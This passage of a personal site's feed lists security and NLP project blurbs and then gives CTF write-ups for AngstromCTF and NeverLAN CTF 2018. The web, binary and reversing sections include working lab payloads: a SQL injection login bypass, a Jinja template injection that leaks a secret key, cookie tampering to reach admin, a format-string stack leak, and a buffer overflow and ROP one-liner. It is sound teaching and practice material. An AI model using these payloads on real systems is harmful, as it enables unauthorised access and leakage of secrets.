</description>
    </item>
    
    <item>
      <title>Network Intrusion Detection in an Adversarial setting</title>
      <link>https://shreyansh26.github.io/project/nids/</link>
      <pubDate>Sun, 05 May 2019 17:28:30 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/nids/</guid>
      <description>&lt;p&gt;A study on fooling Machine Learning/Deep Learning based Network Intrusion Detection systems to prevent them from detecting intrusions. We implement various adversarial machine learning attacks on network traffic data and analyze their effect on the accuracy of the model in detecting intrusions.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Linux Malware detection using Machine Learning</title>
      <link>https://shreyansh26.github.io/project/linux-malware/</link>
      <pubDate>Thu, 03 Jan 2019 18:07:13 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/linux-malware/</guid>
      <description>&lt;p&gt;Implemented various papers on Linux Malware detection, where I analysed the structure of ELF files to determine whether they were malicious or benign. Approaches included the analysis of -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Symbol Table&lt;/li&gt;
&lt;li&gt;Opcode frequency&lt;/li&gt;
&lt;li&gt;ELF file metadata&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Multilingual Surface Realization for NLG</title>
      <link>https://shreyansh26.github.io/project/msr-nlg/</link>
      <pubDate>Mon, 23 Jul 2018 16:52:28 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/msr-nlg/</guid>
      <description>&lt;p&gt;A shared task organized at ACL 2018 (Association for Computational Linguistics, Melbourne, Australia). The task aims to determining the word order and inflecting words from given unordered Universal Dependencies (UD) structures from which word order information has been removed and the tokens have been lemmatized.
Worked on techniques like Language Modelling and Neural Machine Translation methods to solve the problem of reinflection and correct word order generation.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>IIT (BHU) Varanasi at MSR-SRST 2018: A Language Model Based Approach for Natural Language Generation</title>
      <link>https://shreyansh26.github.io/publication/singh-etal-2018-iit/</link>
      <pubDate>Sun, 01 Jul 2018 00:00:00 +0530</pubDate>
      <guid>https://shreyansh26.github.io/publication/singh-etal-2018-iit/</guid>
      <description></description>
    </item>
    
    <item>
      <title>AngstromCTF Writeups</title>
      <link>https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/</link>
      <pubDate>Fri, 23 Mar 2018 12:37:04 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/</guid>
      <description>&lt;p&gt;These are the writeups to the problems I solved during the AngstromCTF.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;misc&#34;&gt;MISC&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Waldo1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a zip file — flags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/2.png&#34; data-caption=&#34;Flag-Waldo1&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Flag-Waldo1
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Waldo2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different. We see the md5 hash of the few files which are the same-&lt;strong&gt;9f6e902c233020026caf0ebbb1cf0ff5&lt;/strong&gt;. So we write the following script-&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/06c29b45da61157827bb20a355faa6c9.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;So, the filename we get is &lt;strong&gt;waldo339.jpg&lt;/strong&gt;. Running &lt;code&gt;strings&lt;/code&gt; on the file we get the flag as — &lt;strong&gt;actf{r3d_4nd_wh1t3_str1p3s}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. That’s not my name&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a pdf file — gettysburg.pdf, but on trying to open it, it does not open, giving incorrect file format error. We run &lt;code&gt;binwalk&lt;/code&gt; on the file to see that it infact is a &lt;code&gt;docx&lt;/code&gt; file. We change the extension to &lt;code&gt;.docx&lt;/code&gt; anf on opening we get the flag as — &lt;strong&gt;actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. File Transfer&lt;/strong&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/3.png&#34; data-caption=&#34;Capture&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Capture
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The highlighted packet shows a JPEG image capture. We export the JPEG as bytes to get the image.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/4.jpeg&#34; data-caption=&#34;Flag — File Transfer&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/4.jpeg&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Flag — File Transfer
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. GIF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On running &lt;code&gt;binwalk&lt;/code&gt; on the given image, we see that it is infact a collection of many images.&lt;/p&gt;
&lt;p&gt;So , we run the command &lt;code&gt;binwalk -D &#39;png image:png&#39; jiggs.gif.png&lt;/code&gt;. On inspecting the extracted files, we see an image which has the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/5.png&#34; data-caption=&#34;Flag — Gif&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/5.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Flag — Gif
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Warmup&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From the term &lt;strong&gt;&lt;em&gt;fine&lt;/em&gt;&lt;/strong&gt; cipher, we get the hint that it could be an &lt;strong&gt;Affine cipher&lt;/strong&gt;. We use an online Affine cipher &lt;a href=&#34;https://www.dcode.fr/affine-cipher&#34;&gt;solver&lt;/a&gt; to get the flag as — &lt;strong&gt;actf{it_begins}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Back to Base-ics&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given the following cipher text -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/6.png&#34; data-caption=&#34;Ciphertext&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Ciphertext
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Now we can easily see that the Part 1 is binary(base 2) and Part 3 is hexadecimal(base 16). On decoding them using any online converter, we get&lt;/p&gt;
&lt;p&gt;Part 1: &lt;strong&gt;actf{0ne_tw0_f0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Part 3: &lt;strong&gt;n_th1rtytw0_s1x&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Also judging from the title of the problem, we can say that all the ciphers have the base of some power of two. We guess that Part 2 could be base 8(octal). using an online octal to text converter we get,&lt;/p&gt;
&lt;p&gt;Part 2: &lt;strong&gt;ur_eight_sixt33&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The last one looks like base64. On decrypting, we get&lt;/p&gt;
&lt;p&gt;Part 4: &lt;strong&gt;tyf0ur_no_m0re}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So, the flag is — &lt;strong&gt;actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. XOR&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This looks like a singlebyteXOR problem. We use the following script&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/982f2b6974fec2195f752bb86cc91393.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;On seeing all the plain texts, we get the flag as — &lt;strong&gt;actf{hope_you_used_a_script}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Intro to RSA&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a classical RSA problem, we use the following script to decrypt&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/f6af59e02f2db1d0e27e88b5b8084585.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;So the flag is — &lt;strong&gt;actf{rsa_is_reallllly_fun!!!!!!}&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;web&#34;&gt;WEB&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Source Me 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here, we are presented with a login page. On inspecting the source, we find the password —&lt;strong&gt;f7s0jkl&lt;/strong&gt;, in the comments. **** So, we login with the username as &lt;code&gt;admin&lt;/code&gt; and password as &lt;code&gt;f7s0jkl&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This gives us the flag-&lt;strong&gt;actf{source_aint_secure}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Get Me&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Initially all we have is a button with the message that only authorized users are allowed to pass. On clicking the button, we get the message that we are not authorized. However in the url bar we see that the get parameter is &lt;code&gt;auth=false&lt;/code&gt;. We change it to &lt;code&gt;auth=true&lt;/code&gt;and hit enter.&lt;/p&gt;
&lt;p&gt;We then get the flag — &lt;strong&gt;actf{why_did_you_get_me}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Sequel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a classic case of SQL injection(SQLi). The hint here is the name of the problem which is pronunciation of SQL.&lt;/p&gt;
&lt;p&gt;We enter both username and password as &lt;code&gt;&#39;or&#39;&#39;=&#39;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This gives us the flag — &lt;strong&gt;actf{sql_injection_more_like_prequel_injection}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Source Me 2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are give another login page. Here, too, the username is &lt;code&gt;admin&lt;/code&gt;. On inspecting the source, we find the script which converts our entered password to md5 and compares it to the hash &lt;strong&gt;bdc87b9c894da5168059e00ebffb9077&lt;/strong&gt;. We use an &lt;a href=&#34;http://www.md5online.org/&#34;&gt;online md5 decryptor to&lt;/a&gt; get the password as &lt;code&gt;password1234&lt;/code&gt;. Entering this gives the flag — &lt;strong&gt;actf{md5_hash_browns_and_pasta_sauce}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. Madlibs&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here, from the Flask code we see that there is a variable app.secret_key, which is basically a config variable. So we head to Tale of a Person section and enter &lt;code&gt;{{config}}&lt;/code&gt; as the Author name and any random strings in the other options.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/7.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/7.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here we see the SECRET_KEY variable assigned to the flag, &lt;strong&gt;actf{wow_ur_a_jinja_ninja}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;reversingre&#34;&gt;Reversing(RE)&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Rev1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, we run &lt;code&gt;strings&lt;/code&gt; on the given ELF executable. We see the string, &lt;strong&gt;s3cret_pa55word&lt;/strong&gt;. This could be the secret password the program is looking for. On running the executable and giving the above string as key, we get the flag. This is to be done on the shell server.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Rev2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The ELF on executing asks for a number to be guessed. We use radare2 to disassemble the code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/8.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/8.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/9.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/9.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The highlighted hex, 0x11d7 is &lt;strong&gt;4567&lt;/strong&gt; in decimal. On entering this, the program now asks us to give two two-digit numbers. We again analyze the disassembled code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/10.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/10.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This tells us that the product of the two numbers should be 0xd67 i.e &lt;strong&gt;3431&lt;/strong&gt;. From &lt;a href=&#34;http://www.mathwarehouse.com/arithmetic/numbers/prime-number/prime-factorization.php?number=3431&#34;&gt;this link,&lt;/a&gt; we find that the numbers are &lt;strong&gt;47&lt;/strong&gt; and &lt;strong&gt;73&lt;/strong&gt;. We enter them in ascending order, i.e 47 and then 73.&lt;/p&gt;
&lt;p&gt;We get the flag as — &lt;strong&gt;actf{4567_47_73}&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Accumulator&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here the ideas is to keep adding integers to an &lt;code&gt;int&lt;/code&gt; variiable and without explicitly entering negative values, we have to make the result negative. This can be done by integer overflow.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/11.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/11.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Running these inputs on the shell server will give us the flag.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Cookie Jar&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a buffer overflow problem. Although we never explicitly gave a value to numCookie, we can overflow the buffer so that it gets a value. I fwe the following input — aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa99999998 to the program, we get the flag.&lt;/p&gt;
&lt;p&gt;The flag is — &lt;strong&gt;actf{eat_cookies_get_buffer}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Number Guess&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We take the help of the hint given. The most common vulnerability of the printf function is the use(or not) of format strings.&lt;/p&gt;
&lt;p&gt;In the code, just before the &lt;code&gt;printf(buf)&lt;/code&gt; the two random integers are initialized. So, when we are asked for our name, if we give the following input, &lt;strong&gt;%d %d %d %d %d %d %d %d %d %d %d %d&lt;/strong&gt; . This would give us the other numbers in the stack. On running this, we take the 3rd and the 9th value as rand1 and rand2. We add them and give the result as our guess.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/12.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/12.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So the flag is -&lt;strong&gt;actf{format_stringz_are_pre77y_sc4ry}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Rop to the Top&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is an example of Return Oriented Programming (ROP) vulnerability which is basically buffer overflow to access the non-executable stack. To exploit it we can use the following set of commands-&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We find that the address of &lt;strong&gt;the_top&lt;/strong&gt; function is &lt;strong&gt;0x8048db&lt;/strong&gt;. Also the buffer size is &lt;strong&gt;0x28&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So, the following command works for us-&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;./rop_to_the_top32 &amp;ldquo;$(python -c &amp;lsquo;print &amp;ldquo;A&amp;rdquo;*0x28 + &amp;ldquo;BBBB&amp;rdquo; + &amp;ldquo;\xdb\x84\x04\x08&amp;rdquo;&#39;)&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We enter the character ‘A’ to fill the size of the buffer, “BBBB” to replace the current stack pointer (%ebx) followed by the address to which we wish to point to, here the address of &lt;strong&gt;the_top&lt;/strong&gt; function.&lt;/p&gt;
&lt;p&gt;Running the above command on the shell server gives us the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;For more writeups, you can follow me on&lt;/em&gt; &lt;a href=&#34;https://github.com/wr47h&#34;&gt;&lt;em&gt;Github&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>NeverLAN CTF 2018 Writeups</title>
      <link>https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/</link>
      <pubDate>Tue, 27 Feb 2018 08:55:58 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/</guid>
      <description>&lt;p&gt;These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;scripting-challenges&#34;&gt;&lt;strong&gt;Scripting Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Basic Math&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a file with some numbers which we had to sum.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/2.png&#34; data-caption=&#34;File&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    File
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;So, we write a simple python script to do it.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/907d53ddd7a9b8b12c0e36ac4afef320.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;This gives the flag — 49562942146280612&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. More Basic Math&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This time we have a larger list of numbers. However, we can just run the script again on the new file.&lt;/p&gt;
&lt;p&gt;This gives us the flag — 50123971501856573397&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Even more Basic Math with some junk&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this file, we see that we have spaces, commas and even English words in between the file. Using any text editor, we replace the commas with a space, and then write a script to replace all spaces with new lines.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/9c4443d59df7469ad8652dcc6676d0b1.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Then we run our first script again. We find two or three English words which give Value Error when the script is run. For them, we can manually remove them.&lt;/p&gt;
&lt;p&gt;Finally, we get the flag — 34659711530484678082&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. JSON Parsing 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On analysing the file, we find that each line is a JSON. We have to find the 5 AV engines which had the highest detection ratio (not detection count) in that file.&lt;/p&gt;
&lt;p&gt;We write the following script to do that —&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/68288cff647b17b45752c6c4602d2fea.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The last five in the list are —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/3.png&#34; data-caption=&#34;High Detection Ratio AV engines&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    High Detection Ratio AV engines
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;So the flag is — &lt;code&gt;SymantecMobileInsight,CrowdStrike,SentinelOne,Invincea,Endgame&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;reversing-challenges&#34;&gt;&lt;strong&gt;Reversing Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Commitment Issues&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The first thing which came to my mind is to run &lt;code&gt;strings&lt;/code&gt; on the file. I did, and got the flag —&lt;strong&gt;flag{don’t_string_me_along_man!}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;interweb-challenges&#34;&gt;&lt;strong&gt;Interweb Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. ajax_not_soap&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On inspecting the script(ajax) of the webpage, we find that the form compares our username and password with one that is stored at the endpoint &lt;code&gt;/webhooks/get_username.php&lt;/code&gt;. On going to that link we find the username as &lt;code&gt;MrClean&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Also the password is also checked by the endpoint &lt;code&gt;/webhooks/get_pass.php?username=*username*&lt;/code&gt; Replacing &lt;em&gt;username&lt;/em&gt; with &lt;code&gt;MrClean&lt;/code&gt; we get the password (also the flag) as &lt;strong&gt;flag{hj38dsjk324nkeasd9}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. the_red_or_blue_pill&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The page says we can either take the red pill(endpoint &lt;code&gt;?red&lt;/code&gt; ) or the blue pill(endpoint &lt;code&gt;?blue&lt;/code&gt; ) but not both. We enter the endpoint as &lt;code&gt;?red&amp;amp;blue&lt;/code&gt; to get the flag as &lt;strong&gt;flag{breaking_the_matrix…I_like_it!}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. ajax_not_borax&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This problem is very similar to ajax_not_soap with the difference here that when we go to the endpoint &lt;code&gt;/webhooks/get_username.php?username=&lt;/code&gt;, we are presented with a hash (c5644ca91d1307779ed493c4dedfdcb7). We use an online MD5 decryptor to get the value as &lt;code&gt;tideade&lt;/code&gt;. Then, when we go to the endpoint &lt;code&gt;/webhooks/get_pass.php?username=tideade&lt;/code&gt;, we get a base64 encoded string, which on decryption gives the flag as &lt;strong&gt;flag{sd90J0dnLKJ1ls9HJed}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Das_blog&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, when we are presented with a login page, we find that a testing credential is available as a comment in the HTML. We login using those credentials. Then, we find that the cureent permission is &lt;code&gt;DEFAULT&lt;/code&gt;. We need &lt;code&gt;admin&lt;/code&gt; permissions to view the flag. On inspecting the cookies, we find that there is a cookie &lt;code&gt;permission&lt;/code&gt; which has its value as user. We use the &lt;strong&gt;EditThisCookie plugin&lt;/strong&gt; to change its value to &lt;code&gt;admin&lt;/code&gt;. On refreshing, we get the flag as a blog post &lt;strong&gt;flag{C00ki3s_c4n_b33_ch4ng3d_?}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;passwords-challenges&#34;&gt;Passwords Challenges&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Encoding != Hashing&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a pcap capture. We open this in Wireshark and analyse the HTTP packets using the &lt;code&gt;http&lt;/code&gt; filter. On reading the contents of the filtered packets, we find the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/4.png&#34; data-caption=&#34;Wireshark Packets analysis&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/images/4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Wireshark Packets analysis
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The flag is &lt;strong&gt;flag{help-me-obiwan}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;trivia-challenges&#34;&gt;&lt;strong&gt;Trivia Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Can you Name it?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This system provides a reference-method for publicly known information-security vulnerabilities and exposures.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— &lt;a href=&#34;https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures&#34;&gt;Common Vulnerabilities and Exposures&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Can you find it? (Bonus)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— EternalBlue. And the ransomware was WannaCry.&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Yummy…&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— These store small pieces of data sent from a website to the user’s computer. This yummy sounding things are stored by the user’s web browser while the user surfing the web. Answer is non-singular.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— Cookies&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Can you find it?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.&lt;/p&gt;
